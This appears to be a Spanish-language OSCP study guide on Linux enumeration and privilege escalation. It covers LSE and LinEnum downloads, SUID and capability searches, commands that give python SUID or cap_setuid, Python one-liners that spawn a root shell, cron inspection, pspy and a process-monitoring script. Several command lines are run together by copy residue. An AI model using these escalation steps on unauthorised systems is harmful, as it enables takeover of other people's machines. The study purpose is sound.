En el **OSCP** y en el pentesting en general, la **enumeración del sistema** es clave para encontrar vulnerabilidades y escalar privilegios. Aquí te presento herramientas y técnicas efectivas para lograrlo.

---

## 🛠 **Herramientas para Enumeración en Linux**

### 🔹 **LSE (Linux Smart Enumeration) – GitHub**

📌 Herramienta avanzada para auditar sistemas Linux.

✅ **Descarga y ejecución:**

bash



`wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh chmod +x lse.sh`

✅ **Uso:**

bash



`./lse.sh -h      # Muestra el panel de ayuda ./lse.sh -l 2    # Escaneo detallado del sistema`

---

### 🔹 **LinEnum – GitHub**

📌 Otra herramienta esencial para la enumeración y búsqueda de vulnerabilidades.

✅ **Descarga y ejecución:**

bash

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh`

---

## 🔥 **Privilegios SUID – Escalada de Privilegios**

### 📍 **Buscar binarios con SUID**

Los binarios con el bit **SUID** activo pueden ser explotados para escalar privilegios.

bash

`find / -perm -4000 -ls 2>/dev/null`

### 📍 **Asignar el bit SUID a un binario**

bash

`chmod u+s /usr/bin/python3.X`

### 📍 **Ejecutar Python con SUID para obtener root**

Si Python tiene SUID, se puede elevar privilegios con:

python



`import os os.setuid(0)` 
`os.system("whoami")` 
`-->Debería devolver "root"` 
`os.system("bash")` 
`-->Obtener una shell como root`

### 📍 **Eliminar SUID de un binario**

bash

CopiarEditar

`chmod 755 /usr/bin/python3.11`

---

## 🔥 **Capabilities en Linux – Escalada de Privilegios**

### 📍 **Buscar binarios con capacidades asignadas**

bash

CopiarEditar

`which getcap getcap -r / 2>/dev/null`

### 📍 **Asignar una capacidad a un binario**

bash

CopiarEditar

`setcap cap_setuid+ep /usr/bin/python3.11`

### 📍 **Eliminar capacidades de un binario**

bash

CopiarEditar

`setcap -r /usr/bin/python3.11`

### 📍 **Ejecutar Python con capacidades asignadas**

bash

CopiarEditar

`which python3.11 | xargs getcap python3.11`

Dentro de Python:

python

CopiarEditar

`import os os.setuid(0) os.system("whoami") os.system("bash")`

---

## 🔎 **Enumeración mediante Cron Jobs y Servicios en Linux**

### 📍 **Buscar tareas programadas (cronjobs)**

bash

CopiarEditar

`crontab -l          # Ver cronjobs del usuario actual ls -la /etc/cron*   # Ver cronjobs del sistema`

### 📍 **Buscar servicios activos (listeners en el sistema)**

bash

CopiarEditar

`systemctl list-listeners`

---

## 🕵️ **Herramienta pspy – Monitoreo en Tiempo Real**

📌 **Pspy** permite analizar procesos y tareas que se ejecutan en segundo plano sin necesidad de privilegios root.

✅ **Ejecución:**

bash

CopiarEditar

`./pspy`

✅ **Ver comandos en ejecución en el sistema:**

bash

CopiarEditar

`ps -eo command        # Muestra comandos en ejecución ps -eo user,command   # Muestra el usuario y los comandos en ejecución`

---

## 🛠 **Script para Monitorear Procesos en Tiempo Real**

Este script detecta cambios en los procesos en ejecución y los muestra en tiempo real.

bash

CopiarEditar

`#!/bin/bash`

`function ctrl_c(){`
  `echo -e "\n\n[!] Saliendo...\n"`
  `tput cnorm; exit 1`
`}`

`#Capturar SIGINT para salir limpiamente`
`trap ctrl_c SIGINT`

`old_process=$(ps -eo user,command)`
`tput civis`

`while true; do`
  `new_process=$(ps -eo user,command)`
  `diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker|procmon"`
  `old_process=$new_process`
`done`

✅ **¿Para qué sirve?**

- Muestra **nuevos procesos** y **procesos eliminados** en el sistema.
- Filtra procesos irrelevantes como `kworker`.
